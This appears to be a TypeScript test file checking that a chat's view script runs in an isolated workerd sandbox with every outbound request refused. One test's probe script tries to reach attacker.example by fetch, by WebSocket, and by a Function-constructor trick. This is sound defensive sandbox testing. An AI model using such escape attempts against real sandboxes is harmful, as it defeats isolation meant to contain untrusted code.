import { readFileSync } from "node:fs";
import { Store, type AnySchema, type GraviewApp, type Principal } from "@graview/core";
import { compileDocument } from "@graview/core/check";
import { runWorkerViewHeadless, type HeadlessPayload, type HeadlessRun } from "@graview/guest/headless";
import { describe, expect, it } from "vitest";

/**
 * A WORKER VIEW RUNS HEADLESS IN WORKERD, WITH NO NETWORK (FR-95).
 *
 * Graview Cloud runs a chat's view before it applies it, in an isolate of
 * its own that is never Cloud's Worker: a dynamic worker with no outbound
 * network. This is that shape in workerd, through Miniflare. The payload's
 * script is one module of a worker of its own; the host's two modules,
 * loaded first, keep a way to answer and call the script's entry with the
 * input; every outbound request the isolate makes is caught here and
 * refused. A LifeLogics lens runs and says what it drew; a view that tries
 * every way out finds none, and nothing reaches the outbound service.
 *
 * Where workerd cannot start, the suite says so and skips. CI sets
 * GRAVIEW_REQUIRE_WORKERD=1, so there it fails instead.
 */
const required = process.env["GRAVIEW_REQUIRE_WORKERD"] === "1";
const fixtures = new URL("../packages/core/tests/document/fixtures/", import.meta.url);
const compiled = compileDocument(JSON.parse(readFileSync(new URL("lifelogics.gdd.json", fixtures), "utf8")));
if (!compiled.ok) throw new Error("the LifeLogics fixture compiles");
const app = compiled.app as GraviewApp<AnySchema>;
const seed = JSON.parse(readFileSync(new URL("lifelogics.seed.json", fixtures), "utf8"));
const store = () => new Store<AnySchema>({ schema: app.schema as AnySchema, mutations: app.mutations ?? [], policy: app.policy!, snapshot: seed });
const partner: Principal = { kind: "agent", id: "keel-agent", roles: ["partner"], onBehalfOf: { kind: "human", id: "party-delivery", roles: ["partner"] } };

type Miniflare = { dispatchFetch(url: string, init?: RequestInit): Promise<Response>; dispose(): Promise<void> };
type MiniflareClass = new (options: unknown) => Miniflare;

/** Every request any isolate tried to send out. */
const outbound: string[] = [];

/** The host's isolate: a worker of its own per run, whose every outbound request is refused and written down. */
function workerdIsolate(Made: MiniflareClass): HeadlessRun {
  return async (payload: HeadlessPayload) => {
    const mf = new Made({
      modules: [
        { type: "ESModule", path: "host.js", contents: `import { answer } from "./before.js";\nimport "./view.js";\nconst run = globalThis[${JSON.stringify(payload.entry)}];\nexport default { async fetch(request) { return answer(await run(await request.text())); } };\n` },
        /* Taken before the view's script hardens the isolate: the host's way to answer. */
        { type: "ESModule", path: "before.js", contents: `const Made = Response;\nexport const answer = (text) => new Made(text);\n` },
        { type: "ESModule", path: "view.js", contents: payload.script },
      ],
      compatibilityDate: "2025-09-01",
      outboundService: (request: Request) => {
        outbound.push(request.url);
        return new Response("refused", { status: 599 });
      },
    });
    try {
      const response = await mf.dispatchFetch("http://view.invalid/", { method: "POST", body: payload.input });
      return await response.text();
    } finally {
      await mf.dispose();
    }
  };
}

async function start(): Promise<{ readonly run: HeadlessRun } | { readonly why: string }> {
  try {
    const { Miniflare } = (await import("miniflare")) as unknown as { Miniflare: MiniflareClass };
    const probe = new Miniflare({ modules: true, script: "export default { fetch: () => new Response('ok') };", compatibilityDate: "2025-09-01" });
    await (await probe.dispatchFetch("http://probe/")).text();
    await probe.dispose();
    return { run: workerdIsolate(Miniflare) };
  } catch (error) {
    if (required) throw error;
    return { why: `workerd could not start here (${error instanceof Error ? error.message.split("\n")[0] : String(error)})` };
  }
}

const started = await start();
const run = "run" in started ? started.run : undefined;
if (!run) console.warn(`[a worker view runs headless in workerd] skipped: ${"why" in started ? started.why : ""}`);

describe.skipIf(!run)("a worker view, headless, in workerd with no outbound network", () => {
  it("runs a LifeLogics lens for the partner and says what it drew", async () => {
    const result = await runWorkerViewHeadless({
      store: store(),
      principal: partner,
      run: run!,
      manifest: { name: "packages", title: "The packages", attach: "package", cardinality: "many", reads: { kinds: ["offer"], edges: ["includes"] } },
      source: readFileSync(new URL("../packages/guest/tests/fixtures/lifelogics/packages.js", import.meta.url), "utf8"),
    });
    if (!result.ok) throw new Error(`${result.reason}: ${result.detail}`);
    expect(result.description.drawnBy).toBe("view:packages");
    expect(result.description.text).toContain("The same offers in three sets, compared on price.");
    expect(result.description.text).toContain("- The small start");
    expect(result.description.text).not.toContain("Two-day workshop");
    expect(outbound).toEqual([]);
  }, 30_000);

  it("leaves a view that tries every way out with none, and nothing reaches the outbound service", async () => {
    const result = await runWorkerViewHeadless({
      store: store(),
      principal: partner,
      run: run!,
      manifest: { name: "probe", attach: "package", cardinality: "many" },
      source: `
        const tried = [];
        for (const name of ["fetch", "Request", "WebSocket", "caches", "connect", "navigator", "scheduler", "EventSource", "XMLHttpRequest", "HTMLRewriter", "crypto"]) tried.push(name + ":" + typeof globalThis[name]);
        try { fetch("https://attacker.example/fetch"); tried.push("fetch ran"); } catch (error) { tried.push("fetch threw"); }
        try { new WebSocket("wss://attacker.example/socket"); tried.push("socket ran"); } catch (error) { tried.push("socket threw"); }
        try { globalThis.constructor.constructor("return fetch")()("https://attacker.example/function"); tried.push("function ran"); } catch (error) { tried.push("function threw"); }
        graview.onProps(() => graview.render(graview.html\`<p>\${tried.join(" ")}</p>\`));
      `,
    });
    if (!result.ok) throw new Error(`${result.reason}: ${result.detail}`);
    const said = result.description.text;
    for (const name of ["fetch", "Request", "WebSocket", "caches", "connect", "navigator", "scheduler", "EventSource", "XMLHttpRequest", "HTMLRewriter"]) expect(said).toContain(`${name}:undefined`);
    expect(said).toContain("fetch threw");
    expect(said).toContain("socket threw");
    expect(said).toContain("function threw");
    expect(outbound).toEqual([]);
  }, 30_000);
});
